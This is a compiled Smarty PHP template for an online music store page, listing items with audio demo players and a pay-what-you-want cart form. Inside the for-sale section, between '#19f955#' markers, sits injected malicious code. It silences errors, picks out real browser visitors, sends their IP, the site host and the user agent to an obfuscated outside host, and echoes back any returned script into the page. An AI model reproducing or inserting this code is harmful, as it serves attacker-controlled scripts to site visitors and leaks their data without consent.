<?php /* Smarty version 2.6.22, created on 2009-03-23 15:31:18
         compiled from C:/Program+Files/Apache+Software+Foundation/Apache2.2/htdocs//templates/store.html */ ?>
<?php $_from = $this->_tpl_vars['items']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>

	<h2><?php echo $this->_tpl_vars['item']['name']; ?>
</h2>
	
	<?php echo $this->_tpl_vars['item']['content']; ?>

	<div class="clearLeft">
		Listen:&nbsp;
		<object type="application/x-shockwave-flash"
		data="/button_player.swf?&song_url=<?php echo $this->_tpl_vars['item']['audio_demo']; ?>
&b_bgcolor=E8DED1&" 
			width="17" height="17">
		<param name="movie" value="/button_player.swf?&song_url=<?php echo $this->_tpl_vars['item']['audio_demo']; ?>
&" />
		</object><br />
		<a href="<?php echo $this->_tpl_vars['item']['audio_demo']; ?>
">Download Audio Demo</a>
	</div>
	
	<?php if ($this->_tpl_vars['item']['for_sale']): ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
		<form action = 'index.php' method = "GET">
			<div class="addToCart">
				<p style="margin:0px;">
					$<input type="text" class="textField" name='price' value="25.00" size='3'/>
					<input type='submit' value='Add To Cart' class='buttonSubmit' /><br />
					<em><strong>$25.00 is the suggested price, but any amount is valid (0.00 and up)</strong></em><br />
				</p>
			</div>
			<input type="hidden" name="add_to_cart" value="true" />
			<input type="hidden" name="item_id" value="<?php echo $this->_tpl_vars['item']['id']; ?>
" />
		</form>
		<hr />
	<?php endif; ?>
	
<?php endforeach; endif; unset($_from); ?>